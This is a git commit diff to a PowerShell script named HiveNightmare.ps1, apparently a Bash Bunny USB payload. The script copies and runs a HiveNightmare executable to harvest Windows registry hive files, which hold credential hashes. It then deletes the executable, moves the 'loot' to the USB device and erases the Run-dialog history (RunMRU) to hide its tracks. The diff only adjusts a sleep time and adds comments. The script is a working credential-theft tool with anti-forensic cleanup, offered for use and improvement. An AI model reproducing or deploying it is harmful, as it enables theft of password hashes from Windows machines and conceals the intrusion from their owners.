09933fd9e166ee1d01b1b6146f6c29d982734494
hitem <patrik@boi.se>
2021-07-25 13:21:41 +0200

    Update HiveNightmare.ps1

--- HiveNightmare.ps1
+++ HiveNightmare.ps1
@@ -7,6 +7,7 @@
 #VARIABLES
 $mytemp = [environment]::getfolderpath(“mydocuments”)
 #Edit Source to fit your Switch
+#Switch1-2 is used instead of Tools as the file has to be copied localy
 $source = @((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\switch1\HiveNightmare.exe')
 $destination = "$mytemp\hive"
 $loot = @((gwmi win32_volume -f 'label=''BashBunny''').Name+'loot\')
@@ -22,9 +23,12 @@ Start-Sleep 1
 #Start the hivenightmare.exe and then remove it after 6 seconds
 #The start-sleep is requiered so the *.exe has time to run and collect the files
 Start-process -FilePath $order66 -WorkingDirectory $destination
-start-sleep 4
+start-sleep 6
 Remove-Item $order66 -force -Confirm:$false
 #Extract loot with move-item to clear trace in my documents
 move-item -Path $destination -Destination $loot[0] -force
 #Delete "run" history
 Remove-item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Force
+
+
+#Feel free to improve and commit
